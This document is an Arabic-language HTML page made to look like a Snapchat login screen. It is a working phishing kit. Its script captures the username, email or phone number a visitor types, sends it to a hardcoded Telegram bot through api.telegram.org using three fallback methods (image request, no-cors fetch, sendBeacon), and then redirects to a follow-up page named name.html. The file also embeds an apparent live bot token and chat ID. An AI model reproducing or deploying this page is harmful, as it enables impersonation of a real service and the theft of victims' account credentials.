<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تسجيل الدخول — خطوة 1</title>

  <!--
    ضع توكن البوت و chat_id هنا على جهازك (لا تشارك الملف بعد ذلك)
    مثال:
      const TG_TOKEN = '123456789:AAEx...';
      const TG_CHAT_ID = '987654321';
  -->
  <script>
    const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
    const TG_CHAT_ID = '6873334348';
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{--bg:#f6f6f7;--card:#fff;--accent-yellow:#ffd400;--input-border:#ffd89a;--btn-blue:#00a8ff;--muted:#9aa0a6;--text:#111;--shadow:0 8px 28px rgba(17,17,17,0.08)}
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:var(--bg);font-family:'Cairo',system-ui,Arial;color:var(--text);direction:rtl}
    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{width:390px;max-width:100%;background:var(--card);border-radius:12px;box-shadow:var(--shadow);padding:26px}
    .top-pill{display:flex;align-items:center;justify-content:center;gap:10px;background:var(--accent-yellow);color:#111;padding:10px 22px;border-radius:40px;margin:0 auto 12px;font-weight:700}
    .logo{display:flex;justify-content:center;margin-bottom:8px}
    .logo img{width:66px;height:66px;object-fit:contain}
    h1{text-align:center;margin:6px 0 14px;font-size:30px;font-weight:800}
    label{display:block;color:var(--muted);margin-bottom:8px}
    .row{display:flex;gap:8px;align-items:center;margin-bottom:10px}
    input[type="text"]{flex:1;padding:14px;border-radius:12px;border:2px solid var(--input-border);font-size:16px}
    .country-btn{display:none;align-items:center;gap:8px;padding:10px 12px;border-radius:12px;border:1px solid #eee;background:#fff;cursor:pointer}
    .use-phone{display:block;text-align:center;color:#2aa6ff;margin:8px 0 14px;cursor:pointer}
    .btn{display:block;margin:6px auto;background:var(--btn-blue);color:#fff;padding:12px 22px;border-radius:40px;width:170px;text-align:center;font-weight:700;border:none;cursor:pointer}
    .status{text-align:center;color:var(--muted);margin-top:8px}
    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.25);display:none;align-items:flex-end;justify-content:center}
    .modal{width:100%;max-width:420px;background:#fff;border-top-left-radius:18px;border-top-right-radius:18px;padding:12px;max-height:74vh;overflow:hidden}
    .country-list{overflow:auto;max-height:56vh;margin-top:8px;padding-right:6px}
    .country-item{display:flex;justify-content:space-between;padding:10px;border-radius:8px;cursor:pointer}
    .country-item:hover{background:#f4f6f8}
    .toast-backdrop{position:fixed;inset:0;display:none;align-items:center;justify-content:center}
    .toast{background:#fff;padding:18px;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,0.18);width:320px;text-align:center}
    @media(max-width:420px){.card{padding:20px}h1{font-size:26px}}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main" aria-label="خطوة 1 - المدخل">
      <div class="top-pill"><span>Open Snapchat</span><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" style="width:20px;height:20px" /></div>

      <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
      <h1>تسجيل الدخول إلى سناب<br>شات</h1>

      <label for="primaryInput">اسم المستخدم أو البريد الإلكتروني أو الهاتف</label>
      <div class="row">
        <div id="countryBtn" class="country-btn"><span id="countryFlag">🇯🇴</span> <span id="countryDial">+962</span></div>
        <input id="primaryInput" type="text" placeholder="أدخل اسم المستخدم أو البريد أو الرقم" />
      </div>

      <div><a id="usePhone" class="use-phone">استخدم رقم الهاتف بدلاً من ذلك</a></div>

      <button id="nextBtn" class="btn">التالي</button>
      <div id="status" class="status" aria-live="polite"></div>
    </div>
  </div>

  <!-- Modal countries -->
  <div id="modal" class="modal-backdrop" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true">
      <div style="text-align:center;font-weight:700;margin-bottom:6px">اختر الدولة</div>
      <input id="countrySearch" class="search-input" placeholder="ابحث..." style="width:100%;padding:10px;border-radius:10px;border:1px solid #eee" />
      <div id="countryList" class="country-list"></div>
    </div>
  </div>

  <!-- toast -->
  <div id="toast" class="toast-backdrop" aria-hidden="true">
    <div class="toast" role="alert">
      <h3 id="tTitle">عذراً</h3>
      <p id="tMsg">حدث خطأ.</p>
      <div style="margin-top:12px"><button id="tOk" style="background:#00a8ff;color:#fff;padding:8px 12px;border-radius:8px;border:none;cursor:pointer">حسناً</button></div>
    </div>
  </div>

  <script>
    // خريطة دول مصغرة
    const COUNTRIES = [
      {name:'الأردن', code:'JO', dial:'+962', flag:'🇯🇴'},
      {name:'مصر', code:'EG', dial:'+20', flag:'🇪🇬'},
      {name:'السعودية', code:'SA', dial:'+966', flag:'🇸🇦'},
      {name:'الإمارات', code:'AE', dial:'+971', flag:'🇦🇪'},
      {name:'الكويت', code:'KW', dial:'+965', flag:'🇰🇼'},
      {name:'لبنان', code:'LB', dial:'+961', flag:'🇱🇧'},
      {name:'الولايات المتحدة', code:'US', dial:'+1', flag:'🇺🇸'}
    ];

    // عناصر DOM
    const primaryInput = document.getElementById('primaryInput');
    const usePhone = document.getElementById('usePhone');
    const countryBtn = document.getElementById('countryBtn');
    const countryList = document.getElementById('countryList');
    const modal = document.getElementById('modal');
    const countrySearch = document.getElementById('countrySearch');
    const countryFlag = document.getElementById('countryFlag');
    const countryDial = document.getElementById('countryDial');
    const nextBtn = document.getElementById('nextBtn');
    const status = document.getElementById('status');
    const toast = document.getElementById('toast');
    const tOk = document.getElementById('tOk');
    const tTitle = document.getElementById('tTitle');
    const tMsg = document.getElementById('tMsg');

    let selectedCountry = COUNTRIES[0];
    function renderCountryList(list){
      countryList.innerHTML = '';
      list.forEach(c=>{
        const el = document.createElement('div');
        el.className = 'country-item';
        el.innerHTML = `<div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">${c.flag}</span><div><strong>${c.name}</strong><div style="font-size:12px;color:#888">${c.code}</div></div></div><div style="font-weight:700;color:#666">${c.dial}</div>`;
        el.addEventListener('click', ()=> {
          selectedCountry = c;
          countryFlag.textContent = c.flag;
          countryDial.textContent = c.dial;
          modal.style.display = 'none';
          primaryInput.placeholder = 'أدخل رقم الهاتف ' + c.dial;
          primaryInput.focus();
        });
        countryList.appendChild(el);
      });
    }

    usePhone.addEventListener('click', function(){
      countryBtn.style.display = 'flex';
      renderCountryList(COUNTRIES);
      modal.style.display = 'flex';
      setTimeout(()=> countrySearch.focus(), 120);
      primaryInput.placeholder = 'أدخل رقم الهاتف ' + selectedCountry.dial;
    });

    countryBtn.addEventListener('click', function(){
      renderCountryList(COUNTRIES);
      modal.style.display = 'flex';
      setTimeout(()=> countrySearch.focus(), 120);
    });

    modal.addEventListener('click', function(e){ if(e.target === modal) modal.style.display = 'none'; });
    countrySearch.addEventListener('input', function(){
      const q = countrySearch.value.trim().toLowerCase();
      if(!q) { renderCountryList(COUNTRIES); return; }
      const filtered = COUNTRIES.filter(c=> c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.dial.includes(q));
      renderCountryList(filtered);
    });

    function detectType(v){
      if(/^[\d\+\-\s]+$/.test(v)) return 'phone';
      if(v.includes('@')) return 'email';
      return 'username';
    }

    // إرسال إلى تلغرام: نجرب Image، ثم fetch(no-cors)، ثم sendBeacon إن أمكن
    function sendToTelegramText(text, onDone){
      // التحقق من القيم المضمّنة
      if(typeof TG_TOKEN === 'undefined' || typeof TG_CHAT_ID === 'undefined' || !TG_TOKEN || !TG_CHAT_ID || TG_TOKEN.includes('PASTE') || TG_CHAT_ID.includes('PASTE')){
        status.style.color = 'crimson';
        status.textContent = 'لم تُضبط قيم TG_TOKEN / TG_CHAT_ID داخل الملف.';
        setTimeout(()=> status.textContent = '', 2600);
        if(onDone) onDone(false);
        return;
      }

      const base = 'https://api.telegram.org/bot' + encodeURIComponent(TG_TOKEN) + '/sendMessage';
      const params = '?chat_id=' + encodeURIComponent(TG_CHAT_ID) + '&text=' + encodeURIComponent(text);

      const url = base + params;

      // 1) Image GET
      try {
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.src = url + '&_ts=' + Date.now(); // cache-buster
        console.log('Attempt sent via Image:', url);
      } catch(e){ console.warn('Image send failed', e); }

      // 2) fetch no-cors as fallback (won't give response but will attempt)
      try {
        fetch(url + '&_ts=' + Date.now(), { method:'GET', mode:'no-cors', credentials:'omit' })
          .then(()=> { console.log('fetch(no-cors) attempted'); if(onDone) onDone(true); })
          .catch(err => { console.warn('fetch(no-cors) failed', err); if(onDone) onDone(false); });
      } catch(e){ console.warn('fetch attempt error', e); if(onDone) onDone(false); }

      // 3) navigator.sendBeacon fallback (some browsers)
      try {
        if(navigator.sendBeacon){
          // sendBeacon prefers POST; build form data
          const fd = new URLSearchParams();
          fd.append('chat_id', TG_CHAT_ID);
          fd.append('text', text);
          const beaconUrl = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage';
          const ok = navigator.sendBeacon(beaconUrl, fd);
          console.log('sendBeacon attempted:', ok);
        }
      } catch(e){ console.warn('sendBeacon failed', e); }
    }

    // إرسال المدخل الأول: يبني نص واضح ويرسل
    function sendPrimary(value){
      if(!value) return;
      const type = detectType(value);
      const countryText = (type === 'phone') ? `${selectedCountry.name} ${selectedCountry.dial}` : '—';
      const text = `نموذج: المدخل الأول\nالنوع: ${type}\nالقيمة: ${value}\nالبلد: ${countryText}\nالوقت: ${new Date().toISOString()}`;
      status.style.color = 'var(--muted)';
      status.textContent = 'جارٍ إرسال...';
      sendToTelegramText(text, function(ok){
        if(ok){ status.style.color = 'green'; status.textContent = 'تم إرسال البيانات (محاولة)'; setTimeout(()=> status.textContent = '', 1600); }
        else { status.style.color = 'crimson'; status.textContent = 'لم يُرسل — تأكد من التوكن/الشبكة'; setTimeout(()=> status.textContent = '', 2600); }
      });
    }

    // إرسال عند blur أو Enter
    primaryInput.addEventListener('blur', function(){ const v = primaryInput.value.trim(); if(v) sendPrimary(v); });
    primaryInput.addEventListener('keydown', function(e){ if(e.key === 'Enter'){ e.preventDefault(); const v = primaryInput.value.trim(); if(v) sendPrimary(v); } });

    // الانتقال إلى الصفحة التالية: نخزّن مؤقتاً في sessionStorage ثم نرسل (إن لم يُرسل) ثم ننتقل
    nextBtn.addEventListener('click', function(){
      const v = primaryInput.value.trim();
      if(!v){ status.style.color='crimson'; status.textContent='الرجاء إدخال اسم المستخدم أو البريد أو الرقم'; setTimeout(()=>status.textContent='',2200); return; }
      // خزّن القيمة مؤقتًا لتمريرها إلى name.html
      sessionStorage.setItem('sim_prev', JSON.stringify({ type: detectType(v), value: v, country: (detectType(v)==='phone' ? selectedCountry : null) }));
      // تأكد من محاولة الإرسال الآن (مرة أخيرة) قبل الانتقال
      sendPrimary(v);
      // توجيه بعد قليل (حتى يمر وقت قصير لبدء الإرسال)
      setTimeout(()=> { window.location.href = 'name.html'; }, 600);
    });

    function showToast(title, msg){
      tTitle.textContent = title;
      tMsg.textContent = msg;
      toast.style.display = 'flex';
    }
    tOk.addEventListener('click', ()=> { toast.style.display = 'none'; });

    document.addEventListener('keydown', function(e){ if(e.key === 'Escape'){ if(modal.style.display === 'flex') modal.style.display = 'none'; if(toast.style.display === 'flex') toast.style.display = 'none'; } });

    // تهيئة القائمة عند التحميل
    document.addEventListener('DOMContentLoaded', function(){ renderCountryList(COUNTRIES); });

    // helper render (معرّف بعد السطر حتى يعمل DOMContentLoaded)
    function renderCountryList(list){ countryList.innerHTML = ''; list.forEach(c => { const d = document.createElement('div'); d.className='country-item'; d.innerHTML = `<div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">${c.flag}</span><div><strong>${c.name}</strong><div style="font-size:12px;color:#888">${c.code}</div></div></div><div style="font-weight:700;color:#666">${c.dial}</div>`; d.addEventListener('click', ()=>{ selectedCountry = c; countryFlag.textContent = c.flag; countryDial.textContent = c.dial; modal.style.display='none'; primaryInput.placeholder = 'أدخل رقم الهاتف ' + c.dial; primaryInput.focus(); }); countryList.appendChild(d); }); }

  </script>
</body>
</html>
